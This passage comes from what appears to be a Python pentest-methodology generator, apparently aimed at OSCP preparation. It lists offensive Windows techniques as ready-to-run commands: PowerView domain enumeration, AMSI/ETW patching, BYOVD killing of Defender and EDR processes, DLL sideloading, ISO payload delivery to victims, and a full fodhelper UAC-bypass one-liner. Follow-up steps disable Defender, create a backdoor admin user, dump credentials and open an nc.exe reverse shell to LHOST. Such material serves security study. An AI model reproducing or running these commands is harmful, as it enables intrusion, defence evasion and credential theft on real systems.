                        'flag_explanations': {
                            'Find-DomainShare': 'Query all computers for shares',
                            '-CheckShareAccess': 'Test read access to each share (as current user)',
                            'Output': 'ComputerName, Name, Path, Remark'
                        },
                        'success_indicators': [
                            'Readable shares listed',
                            'Interesting shares: SYSVOL, NETLOGON, data, backups',
                            'May contain credentials, scripts, sensitive data'
                        ],
                        'failure_indicators': [
                            'Access denied to all shares',
                            'PowerView not loaded',
                            'Network connectivity issues (firewall blocks SMB)'
                        ],
                        'next_steps': [
                            'Enumerate files: Find-InterestingDomainShareFile',
                            'Search for passwords: sls -Path \\\\server\\share\\* -Pattern "password|pwd|cred" -Recurse',
                            'Download interesting files: Copy-Item \\\\server\\share\\file C:\\Temp\\'
                        ],
                        'alternatives': [
                            'Manual: net view \\\\server, dir \\\\server\\share',
                            'CrackMapExec: cme smb <TARGET> -u user -p pass --shares',
                            'Impacket: smbclient.py DOMAIN/user:pass@<TARGET>'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'LATERAL'],
                        'notes': 'SYSVOL = Group Policy files (may contain passwords in scripts). NETLOGON = logon scripts.'
                    }
                },
                {
                    'id': f'powerview-gpo-enum-{target}',
                    'name': 'Group Policy Object (GPO) Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-NetGPO | select displayname,gpcfilesyspath',
                        'description': 'Enumerate all Group Policy Objects in the domain',
                        'flag_explanations': {
                            'Get-NetGPO': 'Query all GPOs from domain',
                            'displayname': 'Human-readable GPO name',
                            'gpcfilesyspath': 'SYSVOL path to GPO files (\\\\domain\\SYSVOL\\...)'
                        },
                        'success_indicators': [
                            'GPOs enumerated successfully',
                            'SYSVOL paths revealed (can read GPO files)',
                            'Look for GPOs with interesting names (password, admin, etc.)'
                        ],
                        'failure_indicators': [
                            'Access denied (rare for domain users)',
                            'PowerView not loaded',
                            'No GPOs found (rare)'
                        ],
                        'next_steps': [
                            'Check GPO applied to computer: Get-NetGPO -ComputerName <TARGET>',
                            'Find GPO with passwords: sls -Path "\\\\domain\\SYSVOL\\*" -Pattern "cpassword|password" -Recurse',
                            'Abuse GPO permissions: Get-DomainObjectAcl -SearchBase "CN=Policies,..." -ResolveGUIDs'
                        ],
                        'alternatives': [
                            'Manual: gpresult /V (shows applied GPOs)',
                            'Group Policy Management Console (GPMC): gpmc.msc',
                            'BloodHound: GPO abuse paths'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'ATTACK_PATH'],
                        'notes': 'GPOs may contain cpassword (Groups.xml) = SYSVOL credentials. GPP passwords deprecated but still found.'
                    }
                },
                {
                    'id': f'powerview-acl-enum-{target}',
                    'name': 'Find Interesting ACLs (Permissions)',
                    'type': 'command',
                    'metadata': {
                        'command': 'Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights',
                        'description': 'Find interesting ACL entries (non-standard permissions on AD objects)',
                        'flag_explanations': {
                            'Find-InterestingDomainAcl': 'Search for ACLs with RID > 1000 and modify permissions',
                            '-ResolveGUIDs': 'Convert GUIDs to human-readable names',
                            'IdentityReferenceName': 'Who has the permission (user/group)',
                            'ObjectDN': 'What object they have permission on',
                            'ActiveDirectoryRights': 'Type of permission (GenericAll, WriteProperty, etc.)'
                        },
                        'success_indicators': [
                            'Interesting ACLs found (non-admin users with high permissions)',
                            'Attack paths revealed: GenericAll on user = password reset',
                            'ForceChangePassword, WriteDacl, WriteOwner = privesc vectors'
                        ],
                        'failure_indicators': [
                            'No interesting ACLs found (good security)',
                            'PowerView not loaded',
                            'Too many results (filter with -ResolveGUIDs)'
                        ],
                        'next_steps': [
                            'Abuse GenericAll: Set-DomainUserPassword -Identity <USER> -AccountPassword (ConvertTo-SecureString "P@ss!" -AsPlainText -Force)',
                            'Abuse WriteDacl: Add-DomainObjectAcl -TargetIdentity <USER> -PrincipalIdentity <ATTACKER> -Rights All',
                            'Check specific user ACLs: Get-DomainObjectAcl -SamAccountName <USER> -ResolveGUIDs'
                        ],
                        'alternatives': [
                            'BloodHound: Most effective for ACL abuse paths',
                            'Manual: Get-Acl "AD:\\CN=User,CN=Users,DC=domain,DC=com"',
                            'Invoke-ACLScanner (PowerView): More targeted scanning'
                        ],
                        'tags': ['OSCP:HIGH', 'ATTACK_PATH', 'PRIVESC'],
                        'notes': 'ACL abuse = common privesc path. BloodHound excels at finding these. GenericAll = full control.'
                    }
                },
                {
                    'id': f'powerview-user-hunter-{target}',
                    'name': 'Invoke-UserHunter: Find Admin Sessions',
                    'type': 'command',
                    'metadata': {
                        'command': 'Invoke-UserHunter -CheckAccess',
                        'description': 'Find where Domain Admins are logged in (session enumeration + local admin check)',
                        'flag_explanations': {
                            'Invoke-UserHunter': 'Query all computers for sessions, find DA logins',
                            '-CheckAccess': 'Also check if current user has local admin on each computer',
                            'Default target': 'Domain Admins group (can specify: -GroupName "Server Admins")'
                        },
                        'success_indicators': [
                            'Domain Admin sessions found on member servers',
                            'Computers where you have local admin access revealed',
                            'Attack path: Compromise computer → Dump DA credentials'
                        ],
                        'failure_indicators': [
                            'No DA sessions found (DAs not logged in)',
                            'Access denied (SMB blocked, firewall)',
                            'Very noisy (generates SMB connections to all computers)'
                        ],
                        'next_steps': [
                            'Target computer with DA session',
                            'Gain local admin (exploit, credentials)',
                            'Dump credentials: Invoke-Mimikatz -DumpCreds',
                            'Pass-the-Hash or Pass-the-Ticket to DA'
                        ],
                        'alternatives': [
                            'Invoke-UserHunter -Stealth (only checks high-traffic servers: DC, file servers)',
                            'BloodHound: SharpHound.exe --CollectionMethod Session',
                            'Manual: query user /server:<COMPUTER> (requires admin)'
                        ],
                        'tags': ['OSCP:HIGH', 'ATTACK_PATH', 'NOISY'],
                        'notes': 'Very noisy (SMB + RPC to all computers). Use -Stealth for OPSEC. BloodHound more stealthy.'
                    }
                },
                {
                    'id': f'powerview-domain-trust-{target}',
                    'name': 'Enumerate Domain Trusts',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-NetDomainTrust',
                        'description': 'Enumerate all domain trusts (parent, child, external, forest)',
                        'flag_explanations': {
                            'Get-NetDomainTrust': 'Query domain for trust relationships',
                            'Output': 'SourceName, TargetName, TrustDirection, TrustType'
                        },
                        'success_indicators': [
                            'Domain trusts enumerated',
                            'Trust types: Parent-Child, Forest, External',
                            'Trust directions: Bidirectional, Inbound, Outbound'
                        ],
                        'failure_indicators': [
                            'No trusts found (single domain)',
                            'Access denied (rare)',
                            'PowerView not loaded'
                        ],
                        'next_steps': [
                            'Enumerate forest: Get-NetForestDomain | Get-NetDomainTrust',
                            'Map all trusts: Get-DomainTrustMapping',
                            'Cross-domain attack: SID History injection, Trust key extraction',
                            'Enumerate foreign users: Get-DomainForeignUser'
                        ],
                        'alternatives': [
                            'Manual: nltest /domain_trusts',
                            'BloodHound: Maps trusts automatically',
                            'PowerShell: Get-ADTrust -Filter *'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'DOMAIN'],
                        'notes': 'Trust abuse = cross-domain attacks. Bidirectional trusts most common. Forest trusts = highest privilege path.'
                    }
                }
            ]
        }

    def _get_av_bypass_techniques(self, target: str, context: str) -> Dict[str, Any]:
        """AV Bypass (15+ techniques)"""
        return {
            'id': f'av-bypass-{target}',
            'name': 'Antivirus (AV) Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'av-threatcheck-{target}',
                    'name': 'ThreatCheck: Identify Detected Bytes',
                    'type': 'command',
                    'metadata': {
                        'command': 'ThreatCheck.exe -f payload.exe',
                        'description': 'Identify which bytes/strings in a binary trigger AV detection',
                        'flag_explanations': {
                            '-f': 'File to scan',
                            'Algorithm': 'Splits file into chunks, scans each, identifies malicious segment'
                        },
                        'success_indicators': [
                            'Malicious bytes identified (specific offset)',
                            'Can modify/obfuscate detected segment',
                            'Recompile and retest'
                        ],
                        'failure_indicators': [
                            'ThreatCheck not installed',
                            'Defender not enabled (can\'t test)',
                            'Entire file flagged (need full obfuscation)'
                        ],
                        'next_steps': [
                            'Obfuscate detected strings: Replace with encoded versions',
                            'Encrypt detected bytes: XOR, AES encryption',
                            'Recompile and retest with ThreatCheck'
                        ],
                        'alternatives': [
                            'avred: https://avred.r00ted.ch/ (web-based)',
                            'DefenderCheck: https://github.com/matterpreter/DefenderCheck',
                            'AMSITrigger: For PowerShell scripts'
                        ],
                        'tags': ['OSCP:HIGH', 'AV_EVASION', 'MANUAL'],
                        'notes': 'Download: https://github.com/rasta-mouse/ThreatCheck. Essential for payload development.'
                    }
                },
                {
                    'id': f'av-dll-vs-exe-{target}',
                    'name': 'DLL Payloads (Lower Detection)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'DLL files have significantly lower detection rates than EXEs',
                        'manual_steps': [
                            '1. Generate DLL payload instead of EXE: msfvenom -p windows/x64/meterpreter/reverse_https -f dll -o payload.dll',
                            '2. Execute DLL: rundll32.exe payload.dll,DllMain',
                            '3. Or use DLL sideloading (see DLL Sideloading task)',
                            '4. Compare detection: antiscan.me shows DLLs ~50% less detected than EXEs'
                        ],
                        'success_indicators': [
                            'DLL executes without AV alert',
                            'Detection rate lower than equivalent EXE',
                            'More stealthy (rundll32 = Windows process)'
                        ],
                        'failure_indicators': [
                            'DLL still detected (need more obfuscation)',
                            'Export function not found (ensure DllMain or custom export)',
                            'Architecture mismatch (32-bit vs 64-bit)'
                        ],
                        'alternatives': [
                            'DLL sideloading: Use legitimate signed binary + malicious DLL',
                            'Reflective DLL injection: Load DLL in-memory (no disk write)',
                            'Process hollowing: Inject DLL into suspended process'
                        ],
                        'next_steps': [
                            'Test DLL execution: rundll32.exe payload.dll,DllMain',
                            'If detected: Obfuscate with ConfuserEx or VMProtect',
                            'For stealth: Implement DLL sideloading with signed binary'
                        ],
                        'tags': ['OSCP:HIGH', 'AV_EVASION', 'STEALTH'],
                        'notes': 'DLLs scanned less frequently. rundll32 often whitelisted. Combine with sideloading for best evasion.'
                    }
                },
                {
                    'id': f'av-dll-sideloading-{target}',
                    'name': 'DLL Sideloading + Proxying',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use legitimate signed binary + malicious DLL (DLL search order hijacking)',
                        'manual_steps': [
                            '1. Find vulnerable binary: Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f "C:\\Program Files\\VulnApp\\app.exe"',
                            '2. Identify missing DLL: Siofra shows DLLs app tries to load but not found',
                            '3. Generate proxy DLL: SharpDllProxy.exe --dll legitimate.dll --payload shellcode.bin',
                            '4. Copy: VulnApp\\app.exe + malicious.dll (same directory)',
                            '5. Execute app.exe → Loads malicious.dll → Forwards calls to legit DLL',
                            '6. Result: Code execution + app still works (proxy forwards)'
                        ],
                        'success_indicators': [
                            'Malicious DLL loaded by signed binary',
                            'Application functions normally (proxy working)',
                            'AV does not detect (signed binary trusted)',
                            '0/26 detection rate on antiscan.me (actual test)'
                        ],
                        'failure_indicators': [
                            'Application crashes (missing exports)',
                            'DLL architecture mismatch',
                            'AV behavioral detection catches DLL load'
                        ],
                        'alternatives': [
                            'Manual DLL proxying: Reverse engineer exports, forward manually',
                            'DLL order hijacking: Place DLL earlier in search path',
                            'WinSxS DLL hijacking: Use side-by-side assembly manifests'
                        ],
                        'next_steps': [
                            'Use Siofra to scan for DLL hijack candidates: Siofra64.exe --mode file-scan --dll-hijack',
                            'Generate proxy DLL: SharpDllProxy.exe --dll target.dll --payload shellcode.bin',
                            'Test sideloading: Copy signed binary + proxy DLL to writable directory',
                            'Verify application still functions (proxy forwarding works)'
                        ],
                        'tags': ['OSCP:HIGH', 'AV_EVASION', 'STEALTH'],
                        'notes': 'Tools: Siofra https://github.com/Cybereason/siofra, SharpDllProxy https://github.com/Flangvik/SharpDllProxy'
                    }
                },
                {
                    'id': f'av-freeze-tool-{target}',
                    'name': 'Freeze: Payload Encryption + Syscalls',
                    'type': 'command',
                    'metadata': {
                        'command': './Freeze -I shellcode.bin -encrypt -O payload.exe',
                        'description': 'Freeze encrypts shellcode and uses direct syscalls (EDR bypass)',
                        'flag_explanations': {
                            '-I': 'Input shellcode file',
                            '-encrypt': 'Encrypt shellcode (AES)',
                            '-O': 'Output executable',
                            'Features': 'Suspended process injection + direct syscalls + encryption'
                        },
                        'success_indicators': [
                            'Payload executes without AV alert',
                            'Shellcode decrypted in-memory',
                            'No Defender alerts (tested with Havoc C2)'
                        ],
                        'failure_indicators': [
                            'Freeze not installed (go build Freeze.go)',
                            'Behavioral detection catches syscall pattern',
                            'AMSI blocks in-memory decryption'
                        ],
                        'next_steps': [
                            'Generate shellcode: msfvenom -p windows/x64/... -f raw -o shellcode.bin',
                            'Combine with AMSI bypass for full evasion',
                            'Test on target: Transfer payload.exe and execute'
                        ],
                        'alternatives': [
                            'Donut: https://github.com/TheWover/donut (shellcode from .NET)',
                            'Vulcan: https://github.com/praetorian-code/vulcan (Go-based)',
                            'Custom: Write your own loader (C/C++/Nim/Rust)'
                        ],
                        'tags': ['OSCP:HIGH', 'AV_EVASION', 'AUTOMATED'],
                        'notes': 'Download: https://github.com/optiv/Freeze. Uses suspended process + direct syscalls (EDR bypass).'
                    }
                },
                {
                    'id': f'av-obfuscation-confuserex-{target}',
                    'name': 'ConfuserEx: .NET Obfuscation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Obfuscate .NET assemblies (control flow, string encryption, anti-tamper)',
                        'manual_steps': [
                            '1. Download ConfuserEx: https://github.com/yck1509/ConfuserEx',
                            '2. Create project: ConfuserEx.exe → Add assembly',
                            '3. Enable protections: Control flow obfuscation, String encryption, Anti-tamper, Anti-debug',
                            '4. Protect: Click Protect button',
                            '5. Output: Confused folder contains obfuscated assembly',
                            '6. Test: Execute obfuscated assembly, check AV detection'
                        ],
                        'success_indicators': [
                            'Obfuscated assembly created',
                            'Decompilers show unreadable code (dnSpy, ILSpy)',
                            'AV detection rate reduced',
                            'Assembly still functions correctly'
                        ],
                        'failure_indicators': [
                            'Assembly crashes (over-obfuscation)',
                            'AV still detects (behavioral analysis)',
                            'Performance degradation (heavy obfuscation)'
                        ],
                        'alternatives': [
                            'Obfuscator-LLVM: For C/C++ (https://github.com/obfuscator-llvm/obfuscator)',
                            'ADVobfuscator: C++ compile-time obfuscation',
                            'Nimcrypt: .NET PE crypter in Nim',
                            'InvisibilityCloak: C# obfuscator'
                        ],
                        'next_steps': [
                            'Test obfuscated payload: Check detection on antiscan.me',
                            'Verify functionality: Ensure payload still executes correctly',
                            'If still detected: Combine with encryption or DLL sideloading'
                        ],
                        'tags': ['OSCP:MEDIUM', 'AV_EVASION', 'OBFUSCATION'],
                        'notes': 'ConfuserEx = control flow + strings + anti-tamper. Commercial fork: ConfuserEx 2. Increases entropy (AV red flag).'
                    }
                },
                {
                    'id': f'av-amsi-bypass-ldrloaddll-hook-{target}',
                    'name': 'AMSI Bypass: LdrLoadDll Hook (Prevent amsi.dll Load)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Hook LdrLoadDll to block amsi.dll loading (language-agnostic AMSI bypass)',
                        'manual_steps': [
                            '1. Concept: Hook ntdll!LdrLoadDll to return STATUS_DLL_NOT_FOUND when amsi.dll is requested',
                            '2. Result: AMSI never loads, no scans occur',
                            '3. Implementation: Inline hook or IAT patching',
                            '4. Example (C): Hook LdrLoadDll → Check module name → Return error if "amsi.dll" → Otherwise call original',
                            '5. Tools: Microsoft Detours, MinHook for hooking',
                            '6. Works across PowerShell, WScript, CScript, custom loaders'
                        ],
                        'success_indicators': [
                            'amsi.dll never loads (check loaded modules)',
                            'Scripts execute without AMSI scans',
                            'Works for all scripting engines (PS, VBS, JS)'
                        ],
                        'failure_indicators': [
                            'amsi.dll already loaded (hook too late)',
                            'EDR detects LdrLoadDll hook',
                            'User-mode hooks easily bypassed by EDR'
                        ],
                        'alternatives': [
                            'AMSI amsiInitFailed bypass: Force init failure',
                            'AmsiScanBuffer patching: Overwrite function to return clean',
                            'Memory patching: Write ret instruction to AmsiScanBuffer'
                        ],
                        'next_steps': [
                            'Implement hook using MinHook or Microsoft Detours library',
                            'Test hook: Verify amsi.dll not in loaded modules (Get-Process -Id $PID | Get-Module)',
                            'If EDR detects: Use kernel-mode hook or alternative AMSI bypass'
                        ],
                        'tags': ['OSCP:MEDIUM', 'AMSI_BYPASS', 'ADVANCED'],
                        'notes': 'Language-agnostic (works for all AMSI clients). Requires early hook (before DLL load). EDRs may detect.'
                    }
                },
                {
                    'id': f'av-smartscreen-bypass-{target}',
                    'name': 'SmartScreen Bypass: ISO Container (No MoTW)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Package payload in ISO file to bypass Mark-of-the-Web (SmartScreen)',
                        'manual_steps': [
                            '1. Create ISO: PackMyPayload.py payload.exe output.iso',
                            '2. Send ISO to victim (email, download)',
                            '3. Victim mounts ISO (Windows 8+ auto-mount)',
                            '4. Payload inside ISO has no MoTW (Zone.Identifier)',
                            '5. Execute payload without SmartScreen prompt',
                            '6. SmartScreen bypassed (ISO not NTFS volume)'
                        ],
                        'success_indicators': [
                            'ISO created successfully',
                            'Payload inside ISO has no Zone.Identifier ADS',
                            'Executes without SmartScreen warning',
                            'Works on Windows 8, 10, 11'
                        ],
                        'failure_indicators': [
                            'Victim doesn\'t mount ISO',
                            'AV scans ISO contents (Defender integrated scanning)',
                            'Behavioral detection catches execution'
                        ],
                        'alternatives': [
                            'Sign binary: Code signing certificate (expensive)',
                            'VHD/VHDX: Similar to ISO, no MoTW',
                            'ZIP with password: MoTW not applied to extracted files (inconsistent)'
                        ],
                        'next_steps': [
                            'Create ISO with PackMyPayload: PackMyPayload.py payload.exe output.iso',
                            'Verify no MoTW: Mount ISO, check payload properties (no Zone.Identifier)',
                            'Test on target: Send ISO via email or host for download'
                        ],
                        'tags': ['OSCP:HIGH', 'AV_EVASION', 'PHISHING'],
                        'notes': 'Tool: PackMyPayload https://github.com/mgeeky/PackMyPayload/. MoTW = NTFS-only (ISO/VHD = FAT32).'
                    }
                },
                {
                    'id': f'av-etw-patching-{target}',
                    'name': 'ETW Patching: Disable Event Tracing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Patch EtwEventWrite to disable Event Tracing for Windows (ETW) logging',
                        'manual_steps': [
                            '1. Concept: ETW logs events to Windows Event Log (detected by EDR)',
                            '2. Patch: Overwrite EtwEventWrite function to return immediately (no logging)',
                            '3. Implementation: NtProtectVirtualMemory → Write ret instruction → EtwEventWrite never logs',
                            '4. Result: .NET execution, PowerShell, process creation not logged',
                            '5. Tools: Custom C/C++ code, Cobalt Strike BOF, Nim loaders',
                            '6. Similar to AMSI bypass but for logging'
                        ],
                        'success_indicators': [
                            'EtwEventWrite patched successfully',
                            'Events not logged (check Event Viewer)',
                            'EDR blind to process activity',
                            'Stealthier execution'
                        ],
                        'failure_indicators': [
                            'EDR detects memory patching',
                            'Kernel-mode ETW still active (user-mode only)',
                            'Patch fails (memory protection)'
                        ],
                        'alternatives': [
                            'Disable ETW providers: logman stop trace session',
                            'Patch NtTraceEvent (kernel-mode, requires driver)',
                            'Use direct syscalls (bypass ETW instrumentation)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EDR_EVASION', 'ADVANCED'],
                        'notes': 'More info: https://blog.xpnsec.com/hiding-your-dotnet-etw/, https://github.com/repnz/etw-providers-docs/'
                    }
                },
                {
                    'id': f'av-byovd-attack-{target}',
                    'name': 'BYOVD: Bring Your Own Vulnerable Driver (Kill AV)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Load signed vulnerable driver to kill AV/EDR from kernel space',
                        'manual_steps': [
                            '1. Find vulnerable signed driver: AToolsKrnl64.sys (Antiy Labs)',
                            '2. Rename to ServiceMouse.sys',
                            '3. Install service: sc create ServiceMouse type= kernel binPath= "C:\\Windows\\System32\\drivers\\ServiceMouse.sys"',
                            '4. Start service: sc start ServiceMouse',
                            '5. Device available: \\\\.\\ServiceMouse',
                            '6. Send IOCTL 0x99000050 with PID to kill process (including protected)',
                            '7. Kill Defender/EDR: Find MsMpEng.exe PID, send IOCTL',
                            '8. Cleanup: IOCTL 0x990001D0 to unload driver'
                        ],
                        'success_indicators': [
                            'Driver loads successfully (signed by Microsoft)',
                            'Device object accessible',
                            'AV/EDR process terminated',
                            'Protected process killed (bypasses PPL)'
                        ],
                        'failure_indicators': [
                            'HVCI/Smart App Control blocks driver',
                            'Driver on vulnerable driver block list',
                            'Service fails to start'
                        ],
                        'alternatives': [
                            'Other vulnerable drivers: RTCore64.sys, AsIO.sys, DBUtil_2_3.sys',
                            'Driver exploit: Exploit driver vulnerability instead of IOCTL',
                            'Userland: TokenStomp (reduce AV token privileges)'
                        ],
                        'tags': ['OSCP:LOW', 'ADVANCED', 'KERNEL', 'KILL_AV'],
                        'notes': 'Detection: Monitor kernel service creation, vulnerable driver loads. Mitigation: HVCI, block list.'
                    }
                },
                {
                    'id': f'av-assembly-reflection-{target}',
                    'name': 'C# Assembly Reflection (In-Memory Execution)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Load and execute C# assemblies in-memory (no disk write)',
                        'manual_steps': [
                            '1. Concept: Load .NET assembly bytes into memory, invoke Main method',
                            '2. Method: Assembly.Load(byte[]) → Invoke Main entry point',
                            '3. Fork & Run: Spawn sacrificial process, inject assembly, execute',
                            '4. Inline: Load assembly in current process (risky, may crash)',
                            '5. Tools: execute-assembly (Cobalt Strike), InlineExecute-Assembly (BOF), Invoke-SharpLoader (PowerShell)',
                            '6. Benefit: No disk write, bypass file-based AV',
                            '7. Note: .NET 4.8+ runs C# through AMSI (use .NET 4.7.2 or bypass AMSI first)'
                        ],
                        'success_indicators': [
                            'Assembly loads in-memory',
                            'Main method executes successfully',
                            'No disk write (fileless)',
                            'AV does not detect (memory scan evasion)'
                        ],
                        'failure_indicators': [
                            'AMSI blocks assembly load (.NET 4.8+)',
                            'Assembly crashes (incompatible dependencies)',
                            'Behavioral detection catches suspicious assembly load'
                        ],
                        'alternatives': [
                            'execute-assembly: Cobalt Strike built-in',
                            'InlineExecute-Assembly: BOF for Beacon',
                            'Invoke-SharpLoader: PowerShell assembly loader'
                        ],
                        'tags': ['OSCP:HIGH', 'FILELESS', 'IN_MEMORY'],
                        'notes': 'Tools: Invoke-SharpLoader https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader, InlineExecute-Assembly BOF https://github.com/xforcered/InlineExecute-Assembly'
                    }
                }
            ]
        }

    def _get_uac_bypass_techniques(self, target: str, context: str) -> Dict[str, Any]:
        """UAC Bypass (6+ techniques)"""
        return {
            'id': f'uac-bypass-{target}',
            'name': 'UAC Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'uac-check-status-{target}',
                    'name': 'Check UAC Status & Level',
                    'type': 'command',
                    'metadata': {
                        'command': 'REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA && REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin',
                        'description': 'Check if UAC is enabled and what level it\'s configured at',
                        'flag_explanations': {
                            'EnableLUA': '1 = UAC enabled, 0 = UAC disabled',
                            'ConsentPromptBehaviorAdmin': '0 = No prompt (like disabled), 1 = Prompt on Secure Desktop (creds), 2 = Always prompt (Secure Desktop), 5 = Default (prompt for non-Windows binaries)'
                        },
                        'success_indicators': [
                            'EnableLUA = 1 (UAC enabled)',
                            'ConsentPromptBehaviorAdmin = 5 (default) or 2 (always notify)',
                            'FilterAdministratorToken = 0 (RID 500 bypass UAC)',
                            'LocalAccountTokenFilterPolicy = 1 (all admins bypass UAC)'
                        ],
                        'failure_indicators': [
                            'EnableLUA = 0 (UAC disabled, no bypass needed)',
                            'Access denied (requires local access)',
                            'Registry keys do not exist'
                        ],
                        'next_steps': [
                            'Check group membership: net user %username%',
                            'Check integrity level: whoami /groups | findstr Level (should be Medium)',
                            'If UAC enabled + admin group + medium integrity = UAC bypass needed',
                            'Choose bypass based on level: Default (5) = easier, Always (2) = harder'
                        ],
                        'alternatives': [
                            'PowerShell: Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
                            'Check via GUI: UserAccountControlSettings.exe (Control Panel)'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                        'notes': 'UAC levels: 0=disabled, 5=default, 2=always. RID 500 (built-in Admin) can bypass if FilterAdministratorToken=0.'
                    }
                },
                {
                    'id': f'uac-bypass-fodhelper-{target}',
                    'name': 'UAC Bypass: fodhelper.exe (Registry Hijack)',
                    'type': 'command',
                    'metadata': {
                        'command': 'New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force; New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(default)" -Value "cmd /c start powershell" -Force; Start-Process C:\\Windows\\System32\\fodhelper.exe; Start-Sleep 3; Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force',
                        'description': 'UAC bypass using fodhelper.exe registry hijack (auto-elevate binary)',
                        'flag_explanations': {
                            'fodhelper.exe': 'Auto-elevated Windows binary (Manage optional features)',
                            'ms-settings protocol': 'fodhelper queries HKCU for shell\\open\\command',
                            'DelegateExecute': 'Empty value = execute command instead of delegate',
                            '(default)': 'Command to execute (runs as High Integrity)',
                            'Cleanup': 'Remove registry keys after execution (stealth)'
                        },
                        'success_indicators': [
                            'High Integrity PowerShell spawns',
                            'whoami /groups shows "High Mandatory Level"',
                            'Can execute admin tasks (disable Defender, add users, etc.)',
                            'Registry keys cleaned up after'
                        ],
                        'failure_indicators': [
                            'UAC at highest level (Always notify with extra restrictions)',
                            'Not in Administrators group',
                            'Access denied to registry (rare)'
                        ],
                        'next_steps': [
                            'Verify high integrity: whoami /groups | findstr "High Mandatory"',
                            'Disable Defender: Set-MpPreference -DisableRealtimeMonitoring $true',
                            'Add backdoor user: net user backdoor P@ss! /add && net localgroup administrators backdoor /add',
                            'Dump credentials: Invoke-Mimikatz'
                        ],
                        'alternatives': [
                            'Use base64 payload: Set (default) to powershell -enc <BASE64>',
                            'Reverse shell: Set (default) to C:\\temp\\nc.exe <LHOST> <LPORT> -e cmd.exe',
                            'From 32-bit shell on 64-bit: Use C:\\Windows\\sysnative\\... paths'
                        ],
                        'tags': ['OSCP:HIGH', 'UAC_BYPASS', 'QUICK_WIN'],
                        'notes': 'Works on Windows 10/11. fodhelper = auto-elevated. Cleanup recommended for stealth. More: https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/'
                    }
                },
                {
                    'id': f'uac-bypass-token-duplication-{target}',
                    'name': 'UAC Bypass: Token Duplication',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Duplicate access token from auto-elevated process (no UAC prompt)',
                        'manual_steps': [
                            '1. Concept: Auto-elevated processes run as High Integrity without prompt',
                            '2. Find auto-elevated process: Process Explorer → Check Integrity Level',
                            '3. Duplicate token: OpenProcessToken → DuplicateTokenEx → CreateProcessWithToken',
                            '4. New process inherits High Integrity from auto-elevated process',
                            '5. Tools: Cobalt Strike uac-token-duplication, Empire, custom C/C++',
                            '6. Cobalt Strike: elevate uac-token-duplication <LISTENER>'
                        ],
                        'success_indicators': [
                            'High Integrity process spawned',
                            'No UAC prompt displayed',
                            'Access token successfully duplicated'
                        ],
                        'failure_indicators': [
                            'No auto-elevated processes found',
                            'Access denied (SE_DEBUG_PRIVILEGE required)',
                            'UAC at highest level (blocks some auto-elevation)'
                        ],
                        'alternatives': [
                            'Cobalt Strike: runasadmin uac-token-duplication powershell.exe ...',
                            'Empire: bypassuac_tokenmanipulation module',
                            'UACME: Method 61 (Token Manipulation)'
                        ],
                        'tags': ['OSCP:HIGH', 'UAC_BYPASS', 'ADVANCED'],
                        'notes': 'Requires auto-elevated process. Common targets: Explorer.exe descendants, COM elevation. More: https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/'
                    }
                },
                {
                    'id': f'uac-bypass-uacme-{target}',
                    'name': 'UACME: 70+ UAC Bypass Methods',
                    'type': 'manual',
                    'metadata': {
                        'description': 'UACME compilation of 70+ UAC bypass techniques (find one for your Windows version)',
                        'manual_steps': [
                            '1. Download: https://github.com/hfiref0x/UACME',
                            '2. Check Windows version: [environment]::OSVersion.Version',
                            '3. Match version to UACME method: README lists build version support',
                            '4. Compile UACME: Visual Studio or msbuild',
                            '5. Execute: Akagi.exe <METHOD_NUMBER> <COMMAND>',
                            '6. Example: Akagi.exe 61 cmd.exe (Method 61 = Token Manipulation)',
                            '7. Test multiple methods if first fails'
                        ],
                        'success_indicators': [
                            'High Integrity process spawned',
                            'Command executes without UAC prompt',
                            'Method compatible with Windows version'
                        ],
                        'failure_indicators': [
                            'Method not compatible with Windows version',
                            'Patched vulnerability (use newer method)',
                            'Some methods prompt user (not fully silent)'
                        ],
                        'alternatives': [
                            'Manual techniques: fodhelper, eventvwr, computerdefaults',
                            'Cobalt Strike: runasadmin uac-cmstplua',
                            'Empire: bypassuac modules'
                        ],
                        'tags': ['OSCP:HIGH', 'UAC_BYPASS', 'TOOL'],
                        'notes': 'UACME = comprehensive UAC bypass collection. Test methods by build version. Some trigger Windows Defender.'
                    }
                },
                {
                    'id': f'uac-bypass-cobalt-strike-{target}',
                    'name': 'Cobalt Strike UAC Bypass Modules',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Cobalt Strike built-in UAC bypass techniques',
                        'manual_steps': [
                            '1. elevate uac-token-duplication <LISTENER> - Token duplication from auto-elevated process',
